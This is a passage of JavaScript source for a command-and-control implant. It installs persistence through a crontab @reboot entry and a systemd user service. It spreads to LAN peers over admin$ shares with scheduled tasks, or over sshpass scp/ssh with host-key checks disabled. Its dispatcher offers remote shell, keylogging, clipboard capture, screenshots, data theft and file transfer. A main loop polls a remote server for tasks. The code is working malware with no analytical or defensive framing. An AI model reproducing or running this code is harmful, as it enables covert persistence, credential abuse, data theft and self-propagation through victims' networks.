    const dest = path.join(base, path.basename(selfAbs));
    fs.copyFileSync(selfAbs, dest);
    const relaunch = relaunchCmd(dest);
    let output = "persistence: copied self to " + dest;
    const cronLine = `@reboot ${relaunch} # c2agent-persist`;
    const cron = runShell(
      `(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '${cronLine}') | crontab -`,
      30000
    );
    let ok = cron.exitCode === 0;
    output += "\n" + cron.output.trim();
    const unitPath = path.join(base, "c2-update.service");
    fs.writeFileSync(
      unitPath,
      "[Unit]\nDescription=c2 update\n\n" +
        "[Service]\nType=simple\nExecStart=/bin/sh -c '" + relaunch + "'\nRestart=always\n\n" +
        "[Install]\nWantedBy=default.target\n"
    );
    const sd = runShell("systemctl --user daemon-reload; systemctl --user enable --now c2-update.service", 30000);
    ok = ok || sd.exitCode === 0;
    output += "\n" + sd.output.trim();
    return { output: truncateOutput(output), exitCode: ok ? 0 : 1 };
  } catch (e) {
    return { output: "persistence: error: " + e.message, exitCode: 1 };
  }
}

// -------------------------------------------------------------- lateral

function taskLateral(args) {
  const ownIp = localIp();
  const ownMatch = String(ownIp || "").match(/^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$/);
  let base = String(args.subnet || "").trim();
  if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(base)) base = ownMatch ? ownMatch[1] : "";
  if (!base) return { output: "lateral: no LAN peers found", exitCode: 1 };

  const peers = new Set();
  const cmds = process.platform === "win32" ? ["arp -a"] : ["arp -a", "ip neigh"];
  for (const cmd of cmds) {
    const r = runShell(cmd, 20000);
    const re = /\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/g;
    let m;
    while ((m = re.exec(String(r.output || ""))) !== null) {
      const ip = m[1];
      if (!ip.startsWith(base + ".") || ip === ownIp) continue;
      const octs = ip.split(".").map((o) => parseInt(o, 10));
      if (octs.some((o) => o > 255)) continue;
      peers.add(ip);
    }
  }
  const list = Array.from(peers).sort().slice(0, 30);
  if (!list.length) return { output: "lateral: no LAN peers found", exitCode: 1 };

  const user = String(args.user || "").trim() || String(process.env.C2_LAT_USER || "");
  const pass = String(args.pass || "") || String(process.env.C2_LAT_PASS || "");
  const hasCreds = !!(user && pass);
  const selfAbs = __filename;
  const basename = path.basename(selfAbs);
  const errBrief = (r) => {
    const t = String(r.output || "").trim();
    const lines = t.split("\n").filter((l) => l.trim().length);
    const brief = lines.slice(0, 3).join("\n") || t;
    return brief.length > 200 ? brief.slice(0, 200) + "..." : brief;
  };

  const lines = [`lateral: ${list.length} peer(s): ${list.join(", ")}`];
  let deployed = 0;
  let failed = 0;
  let skipped = 0;

  for (const host of list) {
    let status;
    if (!hasCreds) {
      skipped++;
      status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)";
    } else if (process.platform === "win32") {
      const r1 = runShell(`net use \\\\${host}\\admin$ /user:${user} "${pass}"`, 20000);
      if (r1.exitCode !== 0) {
        failed++;
        status = `failed (net use: ${errBrief(r1)})`;
      } else {
        const r2 = runShell(`copy /y "${selfAbs}" "\\\\${host}\\admin$\\${basename}"`, 20000);
        if (r2.exitCode !== 0) {
          failed++;
          status = `failed (copy: ${errBrief(r2)})`;
          runShell(`net use \\\\${host}\\admin$ /delete /y`, 20000);
        } else {
          const remote = `\\\\${host}\\admin$\\${basename}`;
          const r3 = runShell(
            `schtasks /Create /S ${host} /TN "c2agent-lateral" /TR "${remote}" /SC ONLOGON /RU ${user} /RP ${pass} /RL HIGHEST /F`,
            20000
          );
          runShell(`net use \\\\${host}\\admin$ /delete /y`, 20000);
          deployed++;
          status = r3.exitCode === 0
            ? "deployed (file dropped + scheduled c2agent-lateral)"
            : `deployed (file dropped; task: ${errBrief(r3)})`;
        }
      }
    } else {
      const probe = runShell("command -v sshpass >/dev/null 2>&1", 10000);
      if (probe.exitCode !== 0) {
        skipped++;
        status = "skipped (sshpass not installed)";
      } else {
        const r1 = runShell(
          `sshpass -p ${shellQ(pass)} scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 ${shellQ(selfAbs)} ${user}@${host}:/tmp/${basename}`,
          30000
        );
        if (r1.exitCode !== 0) {
          failed++;
          status = `failed (scp: ${errBrief(r1)})`;
        } else {
          const remote = `/tmp/${basename}`;
          const rcmd = relaunchCmd(remote);
          const r2 = runShell(
            `sshpass -p ${shellQ(pass)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 ${user}@${host} '${rcmd} &>/dev/null &'`,
            30000
          );
          deployed++;
          status = r2.exitCode === 0
            ? "deployed (file uploaded + launched)"
            : `deployed (file uploaded; launch: ${errBrief(r2)})`;
        }
      }
    }
    lines.push(`  ${host}: ${status}`);
  }
  lines.push(`lateral: deployed=${deployed} failed=${failed} skipped=${skipped}`);
  return { output: truncateOutput(lines.join("\n")), exitCode: 0 };
}

async function executeTask(task) {
  const { task_id: taskId, type, args = {} } = task;
  logmsg(`running task ${taskId} (${type})`);

  switch (type) {
    case "shell": {
      const timeout = Math.max(1, Math.min(parseInt(args.timeout) || 120, 3600));
      return runShell(args.command || "", timeout * 1000);
    }
    case "download":
      return taskDownload(taskId, args);
    case "upload":
      return taskUpload(taskId, args);
    case "sleep":
      return taskSleep(args);
    case "keylog":
      return taskKeylog(args);
    case "clipboard":
      return taskClipboard(args);
    case "screenshot":
      return taskScreenshot(taskId, args);
    case "steal":
      return taskSteal(taskId, args);
    case "clone":
      return taskClone(args);
    case "persistence":
      return taskPersistence(args);
    case "lateral":
      return taskLateral(args);
    case "exit":
      return { output: "exiting", exitCode: 0, _exit: true };
    default:
      return { output: `unknown task type: ${type}`, exitCode: 1 };
  }
}

// ----------------------------------------------------------------- main

function parseArgs() {
  const args = process.argv.slice(2);
  let i = 0;
  while (i < args.length) {
    switch (args[i]) {
      case "--server":
        server = args[++i] || "";
        break;
      case "--token":
        token = args[++i] || "";
        break;
      case "--interval":
        interval = parseInt(args[++i]) || 10;
        break;
      case "--jitter":
        jitter = parseInt(args[++i]) || 0;
        break;
      case "--verbose":
        verbose = true;
        break;
      case "--state":
        stateFile = args[++i] || stateFile;
        break;
    }
    i++;
  }
}

async function main() {
  parseArgs();
  if (!server) server = process.env.C2_SERVER || "";
  if (!token) token = process.env.C2_TOKEN || "";

  if (!server || !token) {
    console.error("usage: node agent.js --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]");
    process.exit(1);
  }
  server = server.replace(/\/+$/, "");

  loadId();
  if (!agentId) {
    try {
      await register();
    } catch (e) {
      logmsg("register failed: " + e.message + " — will retry on next checkin");
    }
  }

  logmsg(`agent running against ${server} (interval ${interval}s)`);

  while (true) {
    try {
      const tasks = await checkin();
      for (const task of tasks) {
        const result = await executeTask(task);
        await report(task.task_id, result.output, result.exit_code != null ? result.exit_code : result.exitCode, result.error || "");
        if (result._exit) {
          logmsg("exit task received — shutting down");
          process.exit(0);
        }
      }
    } catch (e) {
      logmsg("checkin failed: " + e.message);
    }
    const delay = interval + (jitter > 0 ? Math.floor(Math.random() * jitter) : 0);
    await new Promise((r) => setTimeout(r, delay * 1000));
  }
}

main().catch((e) => {
  console.error("fatal: " + e.message);
  process.exit(1);
});
